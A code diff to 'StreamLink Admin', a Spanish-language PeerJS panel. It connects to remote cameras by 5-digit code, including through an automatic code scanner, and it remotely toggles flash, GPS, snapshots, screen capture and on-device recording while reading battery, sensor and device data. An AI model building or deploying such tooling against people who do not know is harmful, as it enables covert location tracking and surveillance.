@@ -11,7 +11,7 @@
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 :root{
   --bg:#05050e;--s1:#0a0a18;--s2:#0f0f1e;--s3:#151528;
-  --border:#ffffff0a;--border2:#ffffff14;--border3:#ffffff20;
+  --border:#ffffff0a;--border2:#ffffff14;--border3:#ffffff22;
   --accent:#7c3aed;--accent2:#a78bfa;--accent-dim:#7c3aed14;
   --red:#ef4444;--red-dim:#ef444414;
   --green:#10b981;--green-dim:#10b98114;
@@ -22,7 +22,8 @@
   --radius:12px;--radius-sm:8px;--radius-xs:5px;
 }
 html,body{height:100%;overflow:hidden}
-body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;display:flex;flex-direction:column;position:relative;}
+body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;
+  display:flex;flex-direction:column;position:relative;}
 body::before{content:'';position:fixed;inset:0;
   background:
     radial-gradient(ellipse 70% 50% at 10% 0%,#7c3aed0a 0%,transparent 60%),
@@ -37,11 +38,9 @@ body::before{content:'';position:fixed;inset:0;
 .brand{display:flex;align-items:center;gap:10px;font-size:.78rem;font-weight:800;letter-spacing:.18em;text-transform:uppercase;}
 .brand-dot{width:8px;height:8px;border-radius:50%;background:var(--accent2);
   box-shadow:0 0 10px var(--accent),0 0 20px #7c3aed60;}
-.brand-name{color:var(--text2)}
-.brand-tag{color:var(--accent2);margin-left:2px}
+.brand-name{color:var(--text2)}.brand-tag{color:var(--accent2);margin-left:2px}
 .topbar-center{display:flex;align-items:center;gap:6px}
 .topbar-right{display:flex;align-items:center;gap:8px}
-
 .badge{font-family:'JetBrains Mono',monospace;font-size:.6rem;font-weight:600;padding:3px 10px;
   border-radius:999px;border:1px solid transparent;letter-spacing:.06em;transition:all .3s;}
 .badge-idle{color:var(--text3);border-color:var(--border2)}
@@ -49,7 +48,6 @@ body::before{content:'';position:fixed;inset:0;
 .badge-live{color:var(--green);border-color:#10b98130;background:var(--green-dim)}
 .badge-err{color:var(--red);border-color:#ef444430;background:var(--red-dim)}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
-
 .top-stat{font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--text3);
   display:flex;align-items:center;gap:6px;padding:0 10px;border-left:1px solid var(--border2);}
 .top-stat-val{color:var(--text);font-weight:600}
@@ -59,26 +57,24 @@ body::before{content:'';position:fixed;inset:0;
 .workspace{flex:1;display:flex;overflow:hidden;position:relative;z-index:1;min-height:0;}
 
 /* ── LEFT PANEL ── */
-.left-panel{width:230px;flex-shrink:0;background:var(--s1);border-right:1px solid var(--border);
+.left-panel{width:240px;flex-shrink:0;background:var(--s1);border-right:1px solid var(--border);
   display:flex;flex-direction:column;overflow:hidden;}
 .panel-header{padding:12px 16px;border-bottom:1px solid var(--border);flex-shrink:0;}
 .panel-title{font-family:'JetBrains Mono',monospace;font-size:.58rem;letter-spacing:.14em;
   text-transform:uppercase;color:var(--text3);margin-bottom:2px;}
 .panel-sub{font-size:.72rem;font-weight:700;color:var(--text2)}
-
 .cam-list{flex:1;overflow-y:auto;padding:8px;}
 .cam-item{border:1px solid var(--border2);border-radius:var(--radius-sm);margin-bottom:6px;
   cursor:pointer;transition:all .2s;overflow:hidden;background:var(--s2);}
 .cam-item:hover{border-color:var(--border3);background:var(--s3)}
 .cam-item.active{border-color:var(--accent);background:var(--accent-dim)}
-.cam-item.active .cam-item-header{background:var(--accent-dim)}
 .cam-item-header{display:flex;align-items:center;gap:8px;padding:9px 10px;border-bottom:1px solid var(--border)}
 .cam-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;transition:background .3s;}
 .cam-dot.live{background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse .8s infinite}
 .cam-dot.connecting{background:var(--yellow);animation:pulse 1s infinite}
-.cam-dot.error{background:var(--red)}
-.cam-dot.offline{background:var(--text3)}
-.cam-name{font-family:'JetBrains Mono',monospace;font-size:.7rem;font-weight:600;color:var(--text);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.cam-dot.error{background:var(--red)}.cam-dot.offline{background:var(--text3)}
+.cam-name{font-family:'JetBrains Mono',monospace;font-size:.7rem;font-weight:600;color:var(--text);
+  flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
 .cam-thumb{width:100%;aspect-ratio:16/9;background:#000;position:relative;overflow:hidden;}
 .cam-thumb video{width:100%;height:100%;object-fit:cover;}
 .cam-thumb-overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
@@ -89,7 +85,6 @@ body::before{content:'';position:fixed;inset:0;
 .cam-footer-stat span{color:var(--text2)}
 .cam-badge-live{font-family:'JetBrains Mono',monospace;font-size:.52rem;padding:2px 6px;
   border-radius:3px;background:var(--green);color:#fff;font-weight:700;margin-left:auto;letter-spacing:.05em;}
-
 .scan-section{padding:10px 8px;border-top:1px solid var(--border);flex-shrink:0;}
 .scan-input-wrap{display:flex;gap:6px;margin-bottom:8px}
 .scan-input{flex:1;background:var(--s2);border:1px solid var(--border2);border-radius:var(--radius-xs);
@@ -101,7 +96,6 @@ body::before{content:'';position:fixed;inset:0;
   padding:7px 12px;font-family:'Syne',sans-serif;font-size:.7rem;font-weight:700;cursor:pointer;
   transition:all .15s;white-space:nowrap;}
 .btn-add:hover{background:var(--accent2);transform:translateY(-1px)}
-.btn-add:active{transform:none}
 .scan-auto-btn{width:100%;background:var(--s2);border:1px solid var(--border2);color:var(--text2);
   border-radius:var(--radius-xs);padding:7px;font-family:'JetBrains Mono',monospace;font-size:.62rem;
   cursor:pointer;transition:all .15s;letter-spacing:.04em;display:flex;align-items:center;justify-content:center;gap:6px;}
@@ -125,7 +119,6 @@ body::before{content:'';position:fixed;inset:0;
 .toolbar-sep{width:1px;height:20px;background:var(--border2);margin:0 4px;}
 .toolbar-label{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--text3);margin-left:auto;}
 .toolbar-val{color:var(--text2);font-weight:600}
-
 .grid-area{flex:1;overflow:auto;padding:10px;}
 .cam-grid{display:grid;gap:8px;width:100%;height:100%;}
 .cam-grid.layout-1{grid-template-columns:1fr;grid-template-rows:1fr;}
@@ -134,7 +127,6 @@ body::before{content:'';position:fixed;inset:0;
 .cam-grid.layout-6{grid-template-columns:1fr 1fr 1fr;grid-template-rows:1fr 1fr;}
 .cam-grid.layout-9{grid-template-columns:1fr 1fr 1fr;grid-template-rows:1fr 1fr 1fr;}
 .cam-grid.layout-auto{grid-template-columns:repeat(auto-fill,minmax(320px,1fr));grid-auto-rows:180px;}
-
 .cam-cell{position:relative;background:#000;border-radius:var(--radius-sm);overflow:hidden;
   border:1px solid var(--border2);transition:border-color .2s;cursor:pointer;}
 .cam-cell:hover{border-color:var(--border3)}
@@ -149,7 +141,6 @@ body::before{content:'';position:fixed;inset:0;
 .cam-cell-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;
   font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--text3);
   background:var(--s1);border:1px dashed var(--border2);border-radius:var(--radius-sm);}
-
 .cell-hud-top{position:absolute;top:0;left:0;right:0;padding:8px;display:flex;align-items:flex-start;justify-content:space-between;z-index:5;
   background:linear-gradient(to bottom,rgba(0,0,0,.7) 0%,transparent 100%);}
 .cell-hud-bot{position:absolute;bottom:0;left:0;right:0;padding:8px;display:flex;align-items:flex-end;justify-content:space-between;z-index:5;
@@ -159,7 +150,7 @@ body::before{content:'';position:fixed;inset:0;
   box-shadow:0 0 12px #ef444450;}
 .cell-cam-name{font-family:'JetBrains Mono',monospace;font-size:.65rem;font-weight:600;
   color:#fff;text-shadow:0 1px 4px rgba(0,0,0,.8);}
-.cell-stats-row{display:flex;gap:6px;align-items:center;}
+.cell-stats-row{display:flex;gap:6px;align-items:center;flex-wrap:wrap;}
 .cell-stat{font-family:'JetBrains Mono',monospace;font-size:.55rem;color:rgba(255,255,255,.6);
   background:rgba(0,0,0,.5);padding:2px 6px;border-radius:3px;}
 .cell-gps-badge{font-family:'JetBrains Mono',monospace;font-size:.52rem;color:var(--green);
@@ -171,7 +162,6 @@ body::before{content:'';position:fixed;inset:0;
   cursor:pointer;transition:all .15s;flex-shrink:0;}
 .cell-action-btn:hover{background:rgba(255,255,255,.15);color:#fff}
 .cell-action-btn svg{width:12px;height:12px}
-
 .empty-state{display:flex;flex-direction:column;align-items:center;justify-content:center;
   height:100%;gap:16px;text-align:center;}
 .empty-state-icon{width:64px;height:64px;border-radius:50%;background:var(--s2);border:1px solid var(--border2);
@@ -180,26 +170,26 @@ body::before{content:'';position:fixed;inset:0;
 .empty-state p{font-size:.78rem;color:var(--text3);max-width:260px;line-height:1.6}
 
 /* ── RIGHT PANEL ── */
-.right-panel{width:270px;flex-shrink:0;background:var(--s1);border-left:1px solid var(--border);
+.right-panel{width:280px;flex-shrink:0;background:var(--s1);border-left:1px solid var(--border);
   display:flex;flex-direction:column;overflow-y:auto;overflow-x:hidden;}
 .section{padding:12px 14px;border-bottom:1px solid var(--border)}
 .section-title{font-family:'JetBrains Mono',monospace;font-size:.58rem;letter-spacing:.14em;
   text-transform:uppercase;color:var(--text3);margin-bottom:10px;}
-
 .detail-header{display:flex;align-items:center;gap:8px;margin-bottom:10px;}
-.detail-dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse .8s infinite;flex-shrink:0;}
+.detail-dot{width:8px;height:8px;border-radius:50%;background:var(--green);
+  box-shadow:0 0 6px var(--green);animation:pulse .8s infinite;flex-shrink:0;}
 .detail-name{font-size:.9rem;font-weight:800;color:var(--text)}
 .detail-id{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--text3)}
-
 .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:5px}
 .info-card{background:var(--s2);border:1px solid var(--border);border-radius:var(--radius-xs);padding:8px;}
-.info-card-label{font-family:'JetBrains Mono',monospace;font-size:.5rem;color:var(--text3);letter-spacing:.08em;text-transform:uppercase;margin-bottom:3px;}
+.info-card-label{font-family:'JetBrains Mono',monospace;font-size:.5rem;color:var(--text3);
+  letter-spacing:.08em;text-transform:uppercase;margin-bottom:3px;}
 .info-card-val{font-family:'JetBrains Mono',monospace;font-size:.82rem;font-weight:600;color:var(--text);line-height:1.2}
 .info-card-val.g{color:var(--green)}.info-card-val.y{color:var(--yellow)}.info-card-val.r{color:var(--red)}
 
 /* ── REMOTE CONTROLS ── */
-.ctrl-row{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px;}
 .ctrl-row-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:5px;margin-bottom:6px;}
+.ctrl-row-2{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px;}
 .ctrl-btn{background:var(--s2);border:1px solid var(--border);color:var(--text2);border-radius:var(--radius-xs);
   padding:8px 6px;display:flex;flex-direction:column;align-items:center;justify-content:center;
   gap:4px;cursor:pointer;transition:all .2s;font-family:'Syne',sans-serif;font-size:.62rem;font-weight:600;}
@@ -209,9 +199,8 @@ body::before{content:'';position:fixed;inset:0;
 .ctrl-btn.act-yellow{border-color:var(--yellow);color:var(--yellow);background:var(--yellow-dim)}
 .ctrl-btn.act-green{border-color:var(--green);color:var(--green);background:var(--green-dim)}
 .ctrl-btn.act-red{border-color:var(--red);color:var(--red);background:var(--red-dim)}
-.ctrl-btn.act-orange{border-color:var(--orange);color:var(--orange);background:var(--orange-dim)}
+.ctrl-btn.act-cyan{border-color:var(--cyan);color:var(--cyan);background:var(--cyan-dim)}
 .ctrl-btn:disabled{opacity:.3;cursor:not-allowed}
-
 .ctrl-btn-full{background:var(--s2);border:1px solid var(--border);color:var(--text2);
   border-radius:var(--radius-xs);padding:8px 12px;display:flex;align-items:center;gap:8px;
   cursor:pointer;transition:all .2s;font-family:'Syne',sans-serif;font-size:.7rem;font-weight:600;
@@ -220,13 +209,10 @@ body::before{content:'';position:fixed;inset:0;
 .ctrl-btn-full:hover{background:var(--s3);color:var(--text)}
 .ctrl-btn-full.rec-active{border-color:var(--red);color:var(--red);background:var(--red-dim);animation:pulse 1s infinite}
 .ctrl-btn-full:disabled{opacity:.3;cursor:not-allowed}
-
-/* Cmd ack flash */
 .ctrl-btn.cmd-ok{animation:cmdok .6s ease-out}
 @keyframes cmdok{0%{background:rgba(16,185,129,.4)}100%{background:var(--s2)}}
 .ctrl-btn.cmd-err{animation:cmderr .6s ease-out}
 @keyframes cmderr{0%{background:rgba(239,68,68,.4)}100%{background:var(--s2)}}
-
 .slider-mini{flex:1;height:2px;background:var(--s3);border-radius:999px;outline:none;-webkit-appearance:none;cursor:pointer;}
 .slider-mini::-webkit-slider-thumb{-webkit-appearance:none;width:12px;height:12px;background:var(--accent2);border-radius:50%;cursor:pointer;}
 
@@ -242,24 +228,35 @@ body::before{content:'';position:fixed;inset:0;
   cursor:pointer;transition:background .15s;background:none;width:100%;}
 .gps-map-btn:hover{background:var(--green-dim)}
 
+/* Sensores */
+.sensor-card{background:var(--s2);border:1px solid var(--border2);border-radius:var(--radius-xs);
+  padding:10px;font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--text2);line-height:2.1;}
+.sensor-row{display:flex;justify-content:space-between;gap:6px;}
+.sensor-val{color:var(--cyan);}
+.sensor-no-data{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--text3);text-align:center;padding:10px 0;}
+
 /* Device info */
 .device-card{background:var(--s2);border:1px solid var(--border2);border-radius:var(--radius-xs);
   padding:10px;font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--text2);line-height:2.1;}
 .di-row{display:flex;justify-content:space-between;gap:6px;}
-.di-val{color:var(--text);text-align:right;max-width:130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.di-val{color:var(--text);text-align:right;max-width:140px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
 .di-val.g{color:var(--green)}.di-val.y{color:var(--yellow)}.di-val.r{color:var(--red)}
 .di-wait{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--text3);text-align:center;padding:10px 0;}
-
 .no-selection{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--text3);text-align:center;padding:20px 0;}
 
 ::-webkit-scrollbar{width:3px}
 ::-webkit-scrollbar-track{background:transparent}
 ::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
 
+/* Snapshot preview */
+.snap-preview{width:100%;aspect-ratio:16/9;object-fit:cover;border-radius:var(--radius-xs);
+  border:1px solid var(--border2);display:none;margin-bottom:6px;}
+
+/* Toast */
 .toast{position:fixed;bottom:20px;right:20px;z-index:999;background:var(--s2);border:1px solid var(--border2);
   border-radius:var(--radius-sm);padding:10px 16px;font-family:'JetBrains Mono',monospace;font-size:.7rem;
   color:var(--text);box-shadow:0 4px 24px rgba(0,0,0,.5);transform:translateY(10px);opacity:0;
-  transition:all .25s;pointer-events:none;max-width:280px;}
+  transition:all .25s;pointer-events:none;max-width:300px;}
 .toast.show{transform:translateY(0);opacity:1}
 .toast.success{border-left:3px solid var(--green);color:var(--green)}
 .toast.error{border-left:3px solid var(--red);color:var(--red)}
@@ -296,7 +293,7 @@ body::before{content:'';position:fixed;inset:0;
     </div>
     <div class="cam-list" id="camList">
       <div style="font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--text3);text-align:center;padding:20px 8px;">
-        Usá el escáner o añadí un código de cámara manualmente.
+        Añadí un código de cámara o usá el escáner automático.
       </div>
     </div>
     <div class="scan-section">
@@ -337,7 +334,6 @@ body::before{content:'';position:fixed;inset:0;
       </button>
       <div class="toolbar-label">Layout: <span class="toolbar-val" id="layoutLabel">1×1</span></div>
     </div>
-
     <div class="grid-area" id="gridArea">
       <div class="empty-state" id="emptyState">
         <div class="empty-state-icon">
@@ -378,54 +374,61 @@ body::before{content:'';position:fixed;inset:0;
       </div>
     </div>
 
-    <!-- ── CONTROLES REMOTOS DE CÁMARA ── -->
+    <!-- CONTROLES REMOTOS -->
     <div class="section" id="controlsSection">
       <div class="section-title">Controles Remotos</div>
-      <div id="controlsContent">
-        <div class="no-selection">Sin cámara activa</div>
-      </div>
+      <div id="controlsContent"><div class="no-selection">Sin cámara activa</div></div>
       <div id="controlsActive" style="display:none">
 
-        <!-- Fila 1: Voltear + Flash + GPS -->
-        <div class="ctrl-row-3" style="margin-bottom:6px">
+        <!-- Fila 1: Voltear · Flash · GPS -->
+        <div class="ctrl-row-3">
           <button class="ctrl-btn" id="ctrl-remote-flip">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
               <path d="M7 16V4m0 0L3 8m4-4l4 4"/><path d="M17 8v12m0 0l4-4m-4 4l-4-4"/>
-            </svg>
-            Voltear
+            </svg>Voltear
           </button>
           <button class="ctrl-btn" id="ctrl-remote-torch">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
               <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
-            </svg>
-            Flash
+            </svg>Flash
           </button>
           <button class="ctrl-btn" id="ctrl-remote-gps">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
               <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/>
-            </svg>
-            GPS
+            </svg>GPS
           </button>
         </div>
 
-        <!-- Fila 2: Snapshot + PiP -->
-        <div class="ctrl-row">
+        <!-- Fila 2: Captura · PiP · Pantalla -->
+        <div class="ctrl-row-3">
           <button class="ctrl-btn" id="ctrl-snap">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/><circle cx="12" cy="13" r="4"/></svg>
-            Captura
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/>
+              <circle cx="12" cy="13" r="4"/>
+            </svg>Captura
           </button>
           <button class="ctrl-btn" id="ctrl-pip">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><rect x="12" y="10" width="8" height="6" rx="1" fill="currentColor" opacity=".5"/></svg>
-            PiP
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="2" y="3" width="20" height="14" rx="2"/>
+              <rect x="12" y="10" width="8" height="6" rx="1" fill="currentColor" opacity=".5"/>
+            </svg>PiP
+          </button>
+          <button class="ctrl-btn" id="ctrl-screen">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="2" y="3" width="20" height="14" rx="2"/>
+              <path d="M8 21h8M12 17v4"/>
+            </svg>Pantalla
           </button>
         </div>
+
+        <!-- Snapshot preview -->
+        <img id="snapPreview" class="snap-preview" alt="Snapshot">
 
         <!-- Grabación -->
         <button class="ctrl-btn-full" id="ctrl-rec">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
             <circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3" fill="currentColor"/>
-          </svg>
-          Iniciar Grabación (en cámara)
+          </svg>Iniciar Grabación (en cámara)
         </button>
 
         <!-- Volumen local -->
@@ -450,9 +453,11 @@ body::before{content:'';position:fixed;inset:0;
         </div>
 
         <!-- Desconectar -->
-        <button class="ctrl-btn-full" id="ctrl-disconnect" style="border-color:#ef444430;color:var(--red);background:var(--red-dim);">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18.36 6.64a9 9 0 11-12.73 0M12 2v10"/></svg>
-          Desconectar Cámara
+        <button class="ctrl-btn-full" id="ctrl-disconnect"
+          style="border-color:#ef444430;color:var(--red);background:var(--red-dim);">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M18.36 6.64a9 9 0 11-12.73 0M12 2v10"/>
+          </svg>Desconectar Cámara
         </button>
       </div>
     </div>
@@ -470,9 +475,21 @@ body::before{content:'';position:fixed;inset:0;
         <div class="gps-row"><span>Rumbo</span><span class="gps-val" id="g-head">—</span></div>
       </div>
       <button class="gps-map-btn" id="gpsMapBtn" style="display:none">
-        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
-        Ver en Google Maps
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/>
+        </svg>Ver en Google Maps
       </button>
+    </div>
+
+    <!-- Sensores de movimiento -->
+    <div class="section">
+      <div class="section-title">Sensores de Movimiento</div>
+      <div class="sensor-no-data" id="sensorNoData">Sin datos de sensores</div>
+      <div class="sensor-card" id="sensorCard" style="display:none">
+        <div class="sensor-row"><span>Alfa (Z)</span><span class="sensor-val" id="s-alpha">—</span></div>
+        <div class="sensor-row"><span>Beta (X)</span><span class="sensor-val" id="s-beta">—</span></div>
+        <div class="sensor-row"><span>Gamma (Y)</span><span class="sensor-val" id="s-gamma">—</span></div>
+      </div>
     </div>
 
     <!-- Device Info -->
@@ -490,30 +507,29 @@ body::before{content:'';position:fixed;inset:0;
         <div class="di-row"><span>Idioma</span><span class="di-val" id="di-lang">—</span></div>
         <div class="di-row"><span>Zona horaria</span><span class="di-val" id="di-tz">—</span></div>
         <div class="di-row"><span>Touch points</span><span class="di-val" id="di-touch">—</span></div>
+        <div class="di-row"><span>Batería</span><span class="di-val" id="di-battery">—</span></div>
         <div class="di-row"><span>Online</span><span class="di-val g" id="di-online">—</span></div>
       </div>
     </div>
 
-  </div>
+  </div><!-- /right-panel -->
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
 // ════════════════════════════════════════════
-//  STREAMLINK ADMIN — Multi-camera viewer
-//  v2.0 — Scanner optimizado + bugs corregidos
+//  STREAMLINK ADMIN v2.0 — Panel completo
 // ════════════════════════════════════════════
 
-// ── ESTADO GLOBAL ──
 let adminPeer   = null;
-let cameras     = {};       // id → camState
+let cameras     = {};
 let selectedId  = null;
 let currentLayout = 1;
 let isScanning  = false;
 let scanAbort   = false;
 
-// ── UTILIDADES ──
+// ── UTILS ──
 function toast(msg, type = 'info', dur = 3000) {
   const el = document.getElementById('toast');
   el.textContent = msg;
@@ -544,23 +560,19 @@ function updateTopStats() {
   else                            setStatus('MONITOREANDO', 'badge-scan');
 }
 
-// ── ENVIAR COMANDO A CÁMARA ──
+// ── ENVIAR COMANDO ──
 function sendCamCommand(camId, action, value) {
   const cam = cameras[camId];
-  if (!cam || !cam.dataConn) { toast('Canal de datos no disponible', 'error'); return false; }
-  if (cam.dataConn.readyState !== 'open') { toast('Canal de datos no está abierto', 'error'); return false; }
+  if (!cam || !cam.dataConn || cam.dataConn.readyState !== 'open') {
+    toast('Canal de datos no disponible', 'error'); return false;
+  }
   const msg = { type: 'cmd', action };
   if (value !== undefined) msg.value = value;
-  try {
-    cam.dataConn.send(JSON.stringify(msg));
-    return true;
-  } catch (e) {
-    toast('Error al enviar comando', 'error');
-    return false;
-  }
+  try { cam.dataConn.send(JSON.stringify(msg)); return true; }
+  catch (e) { toast('Error al enviar comando', 'error'); return false; }
 }
 
-// ── INICIALIZAR PEER ADMIN ──
+// ── INIT PEER ──
 function initAdminPeer(cb) {
   if (adminPeer && !adminPeer.destroyed) {
     if (adminPeer.open) { if (cb) cb(); return; }
@@ -581,10 +593,9 @@ function initAdminPeer(cb) {
     setStatus('LISTO', 'badge-live');
     if (cb) cb();
   });
-  adminPeer.on('error', (err) => {
-    // Ignorar errores de peer-not-found durante el escaneo
+  adminPeer.on('error', err => {
     if (err.type === 'peer-unavailable') return;
-    console.warn('PeerJS error:', err.type);
+    console.warn('PeerJS:', err.type);
   });
 }
 
@@ -594,14 +605,12 @@ function connectCamera(camId) {
   if (!camId || camId.length !== 5 || !/^\d+$/.test(camId)) {
     toast('Código inválido (5 dígitos)', 'error'); return;
   }
-  if (cameras[camId]) {
-    toast('Cámara ya conectada', 'info'); selectCamera(camId); return;
-  }
+  if (cameras[camId]) { toast('Cámara ya conectada', 'info'); selectCamera(camId); return; }
 
   cameras[camId] = {
     id: camId, name: `Cam ${camId}`, status: 'connecting',
     call: null, dataConn: null, stream: null,
-    gps: null, deviceInfo: null,
+    gps: null, deviceInfo: null, sensorData: null,
     stats: { lat: '—', bit: '—', pkt: '—', q: '—', res: '—', time: '—' },
     prevBytes: 0, volume: 1, brightness: 1, zoom: 1,
     torchState: false, gpsActive: false, isRecording: false,
@@ -610,7 +619,7 @@ function connectCamera(camId) {
   renderCamList(); renderGrid(); updateTopStats();
 
   initAdminPeer(() => {
-    // Canal de datos para comandos y eventos
+    // Data channel
     const dc = adminPeer.connect(camId, { reliable: true, label: 'data' });
     dc.on('open', () => {
       if (!cameras[camId]) return;
@@ -622,12 +631,14 @@ function connectCamera(camId) {
         if      (msg.type === 'gps')        handleGps(camId, msg);
         else if (msg.type === 'deviceInfo') handleDeviceInfo(camId, msg);
         else if (msg.type === 'cmdAck')     handleCmdAck(camId, msg);
-      } catch (e) { /* malformed message */ }
+        else if (msg.type === 'sensor')     handleSensor(camId, msg);
+        else if (msg.type === 'snapshot')   handleSnapshot(camId, msg);
+      } catch (e) {}
     });
     dc.on('error', () => {});
     dc.on('close', () => {});
 
-    // Stream vacío para iniciar la llamada (el stream real viene de la cámara)
+    // Stream vacío para iniciar la llamada
     let emptyStream;
     try {
       const canvas = document.createElement('canvas');
@@ -638,15 +649,12 @@ function connectCamera(camId) {
         canvas.captureStream(1).getVideoTracks()[0],
         dst.stream.getAudioTracks()[0]
       ]);
-    } catch (e) {
-      emptyStream = new MediaStream();
-    }
+    } catch (e) { emptyStream = new MediaStream(); }
 
     const call = adminPeer.call(camId, emptyStream);
     if (!call) { removeCam(camId, null); return; }
     cameras[camId].call = call;
 
-    // Timeout si no responde en 12s
     const timeout = setTimeout(() => {
       if (cameras[camId] && cameras[camId].status === 'connecting') removeCam(camId, null);
     }, 12000);
@@ -660,9 +668,7 @@ function connectCamera(camId) {
       attachStream(camId, stream);
       startCamStats(camId, call);
       startViewTimer(camId);
-      renderCamList();
-      renderGrid();
-      updateTopStats();
+      renderCamList(); renderGrid(); updateTopStats();
       toast(`✓ Cámara ${camId} conectada`, 'success');
       if (!selectedId) selectCamera(camId);
     });
@@ -689,50 +695,36 @@ function removeCam(camId, msg) {
   stopCamStats(camId);
   stopViewTimer(camId);
   delete cameras[camId];
-  if (selectedId === camId) { selectedId = null; }
+  if (selectedId === camId) selectedId = null;
   renderCamList(); renderGrid(); updateTopStats(); renderDetailPanel();
   if (msg) toast(msg, 'error');
 }
 
-// ── COMMAND ACK ──
+// ── MANEJADORES DE MENSAJES ──
 function handleCmdAck(camId, msg) {
   if (!cameras[camId]) return;
   const cam = cameras[camId];
 
   if (msg.error) {
     toast(`${msg.action}: ${msg.error}`, 'warn');
-    // Flash rojo en botón si corresponde
-    const btnMap = {
-      flip: 'ctrl-remote-flip', torch: 'ctrl-remote-torch', gps_start: 'ctrl-remote-gps',
-      gps_stop: 'ctrl-remote-gps', zoom: null, brightness: null,
-    };
-    const btnId = btnMap[msg.action];
-    if (btnId) {
-      const btn = document.getElementById(btnId);
-      if (btn) { btn.classList.add('cmd-err'); setTimeout(() => btn.classList.remove('cmd-err'), 700); }
-    }
+    flashBtn('ctrl-remote-' + msg.action, 'cmd-err');
     return;
   }
 
-  // Actualizar estado local desde ack
   if (msg.action === 'torch') {
     cam.torchState = !!msg.value;
     if (selectedId === camId) updateRemoteControlUI(camId);
-    // Flash verde en botón torch
-    const btn = document.getElementById('ctrl-remote-torch');
-    if (btn) { btn.classList.add('cmd-ok'); setTimeout(() => btn.classList.remove('cmd-ok'), 700); }
+    flashBtn('ctrl-remote-torch', 'cmd-ok');
   }
   if (msg.action === 'flip') {
-    const btn = document.getElementById('ctrl-remote-flip');
-    if (btn) { btn.classList.add('cmd-ok'); setTimeout(() => btn.classList.remove('cmd-ok'), 700); }
+    flashBtn('ctrl-remote-flip', 'cmd-ok');
   }
   if (msg.action === 'gps_start') {
     cam.gpsActive = !!msg.active;
     if (selectedId === camId) updateRemoteControlUI(camId);
   }
   if (msg.action === 'gps_stop') {
-    cam.gpsActive = false;
-    cam.gps = null;
+    cam.gpsActive = false; cam.gps = null;
     if (selectedId === camId) { updateRemoteControlUI(camId); renderGpsPanel(); }
   }
   if (msg.action === 'record_start') {
@@ -745,27 +737,53 @@ function handleCmdAck(camId, msg) {
   }
 }
 
-// ── ATTACH STREAM ──
-function attachStream(camId, stream) {
-  // Grid view
-  const gv = document.getElementById(`gvid-${camId}`);
-  if (gv) { gv.srcObject = stream; gv.muted = false; gv.volume = cameras[camId]?.volume ?? 1; gv.play().catch(() => {}); }
-  // Thumbnail list
-  const tv = document.getElementById(`tvid-${camId}`);
-  if (tv) { tv.srcObject = stream; tv.play().catch(() => {}); }
-}
-
-// ── GPS + DEVICE INFO ──
 function handleGps(camId, d) {
   if (!cameras[camId]) return;
   cameras[camId].gps = (d.active === false) ? null : d;
   updateCellGps(camId);
   if (selectedId === camId) renderGpsPanel();
 }
+
 function handleDeviceInfo(camId, d) {
   if (!cameras[camId]) return;
   cameras[camId].deviceInfo = d;
   if (selectedId === camId) renderDevicePanel();
+}
+
